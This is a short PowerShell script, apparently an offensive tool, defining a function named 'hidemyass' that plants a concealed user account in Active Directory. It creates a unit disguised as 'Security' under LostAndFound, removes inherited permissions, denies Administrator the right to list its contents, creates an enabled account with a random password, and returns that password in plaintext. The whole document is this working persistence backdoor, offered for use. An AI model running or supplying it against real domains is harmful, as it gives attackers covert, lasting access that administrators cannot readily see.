# hidemyass -Name ghost -Admin hex0r
# Chose a name for the "hidden" user and a user that has the rights over this object with the -admin switch
# to see this sh1t in your environment use something like: https://github.com/canix1/ADACLScanner

Import-Module ActiveDirectory

function hidemyass {
    param(
        [Parameter(Mandatory=$true)][string]$Name,
        [string]$Admin = "Administrator"
    )

    # Generate samAccountName
    $sam = ($Name -replace '\s','').ToLower()

    # Generate temporary password
    $lower = 97..122 | ForEach-Object {[char]$_}
    $upper = 65..90  | ForEach-Object {[char]$_}
    $digits = 48..57 | ForEach-Object {[char]$_}
    $special = '!','@','#','$','%','^','&','*','(',')','-','_'
    $chars = $lower + $upper + $digits + $special
    $pwPlain = -join (1..12 | ForEach-Object { $chars | Get-Random })
    $pw = ConvertTo-SecureString $pwPlain -AsPlainText -Force

    # Domain DN
    $domainDN = (Get-ADDomain).DistinguishedName

    # 1. Create hidden OU under CN=System
    $systemPath = "CN=LostAndFound,$domainDN"
    $hiddenOUName = "Security"
    $hiddenOUPath = "OU=$hiddenOUName,$systemPath"

    if (-not (Get-ADOrganizationalUnit -Filter "Name -eq '$hiddenOUName'" -SearchBase $systemPath -ErrorAction SilentlyContinue)) {
        New-ADOrganizationalUnit -Name $hiddenOUName -Path $systemPath -ProtectedFromAccidentalDeletion $true
    }

    # 2. Resolve admin to NTAccount
    try {
        $adminObj = Get-ADUser -Identity $Admin -ErrorAction Stop
        $adminNt  = $adminObj.SID.Translate([System.Security.Principal.NTAccount])
    } catch {
        $adminNt  = New-Object System.Security.Principal.NTAccount($Admin)
    }

    # 3. Apply ACLs to hidden OU
    $ouADPath = "AD:$hiddenOUPath"
    $ouAcl = Get-Acl -Path $ouADPath
    $ouAcl.SetAccessRuleProtection($true,$false)
    foreach ($r in $ouAcl.Access) { $ouAcl.RemoveAccessRule($r) }

    $full = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
    $allow = [System.Security.AccessControl.AccessControlType]::Allow
    $noInheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All

    $ouAcl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule($adminNt,$full,$allow,$noInheritance)))
    $ouAcl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule((New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")),$full,$allow,$noInheritance)))

    # Optional: Deny ListChildren for whomever you want, groups or users
    $blockGroup = "Administrator"
    $blockNt = New-Object System.Security.Principal.NTAccount($blockGroup)
    $denyRights = [System.DirectoryServices.ActiveDirectoryRights]::ListChildren
    $denyType = [System.Security.AccessControl.AccessControlType]::Deny
    $ouAcl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule($blockNt,$denyRights,$denyType,$noInheritance)))

    Set-Acl -Path $ouADPath -AclObject $ouAcl

    # 4. Create user in hidden OU
    $user = New-ADUser -Name $Name -SamAccountName $sam -AccountPassword $pw -Enabled $true -Path $hiddenOUPath -PassThru

    # 5. Apply ACLs to the user object
    $userPath = "AD:$($user.DistinguishedName)"
    $userAcl = Get-Acl -Path $userPath
    $userAcl.SetAccessRuleProtection($true,$false)
    foreach ($r in $userAcl.Access) { $userAcl.RemoveAccessRule($r) }

    $userAcl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule($adminNt,$full,$allow,$noInheritance)))
    $userAcl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule((New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")),$full,$allow,$noInheritance)))

    Set-Acl -Path $userPath -AclObject $userAcl

    # 6. Return summary
    return [PSCustomObject]@{
        Name = $Name
        SamAccountName = $sam
        TemporaryPassword = $pwPlain
        AdminWithAccess = $adminNt.Value
        # HiddenOU = $hiddenOUName
        # OUPath = $hiddenOUPath
    }
}
